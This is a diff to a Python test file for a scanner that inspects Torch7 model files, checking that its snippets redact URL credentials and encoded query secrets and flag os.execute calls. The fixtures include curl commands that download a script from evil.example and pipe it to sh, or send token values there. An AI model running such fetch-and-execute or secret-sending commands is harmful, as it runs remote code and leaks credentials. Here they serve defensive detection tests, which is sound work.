@@ -119,15 +119,51 @@ def test_torch7_snippet_redacts_url_userinfo_signed_queries_and_bearer_values() 
     assert "BEARERSECRET123" not in snippet
     assert "URLPASSWORD123" not in snippet
     assert "SIGNATURESECRET123" not in snippet
-    assert "Authorization: Bearer <redacted>" in snippet
+    assert "Authorization: <redacted>" in snippet
     assert "https://<credentials-redacted>@evil.example/payload.sh" in snippet
     assert "x-amz-signature=<redacted>" in snippet
+
+
+def test_torch7_snippet_redacts_iteratively_encoded_query_secrets() -> None:
+    snippet = Torch7Scanner._snippet(
+        "cmd=os.execute('curl https://evil.example/?token%3DWHOLESECRET123 "
+        "https://evil.example/?to%256ben=KEYSECRET456 "
+        "https://evil.example/?ok=token%252525253DVALUESECRET789')",
+        max_chars=500,
+    )
+
+    assert "WHOLESECRET123" not in snippet
+    assert "KEYSECRET456" not in snippet
+    assert "VALUESECRET789" not in snippet
+    assert snippet.count("<redacted>") == 3
+
+
+def test_torch7_snippet_preserves_execution_syntax_for_sensitive_target_names() -> None:
+    snippet = Torch7Scanner._snippet(
+        "token = assert((os.execute('curl https://evil.example/?x=1|sh')))",
+        max_chars=500,
+    )
+
+    assert "token = assert((os.execute" in snippet
+    assert "?x=1|sh" in snippet
+    assert "<redacted>" not in snippet
+
+
+def test_torch7_snippet_restores_targets_before_truncation() -> None:
+    snippet = Torch7Scanner._snippet(
+        "configuration.credentials.token = os.execute('curl https://evil.example/public/payload.sh | sh')",
+        max_chars=60,
+    )
+
+    assert len(snippet) == 60
+    assert snippet.endswith("...")
+    assert snippet.startswith("configuration.credentials.token = os.execute")
 
 
 def test_scan_preserves_benign_torch7_execution_examples(tmp_path: Path) -> None:
     payload = (
         b"T7\x00\x00torch.FloatTensor nn.Sequential\n"
-        b"cmd = os.execute('curl https://evil.example/public/payload.sh | sh')\n"
+        b"token = os.execute('curl https://evil.example/public/payload.sh?x=1|sh')\n"
     )
     path = _write_torch7_file(tmp_path, payload, filename="benign-url.t7")
 
@@ -140,7 +176,8 @@ def test_scan_preserves_benign_torch7_execution_examples(tmp_path: Path) -> None
     ]
     assert len(execution_findings) == 1
     examples = execution_findings[0].details["examples"]
-    assert any("https://evil.example/public/payload.sh" in example for example in examples)
+    assert any("token = os.execute" in example for example in examples)
+    assert any("https://evil.example/public/payload.sh?x=1|sh" in example for example in examples)
     assert all("<redacted>" not in example for example in examples)
 
 
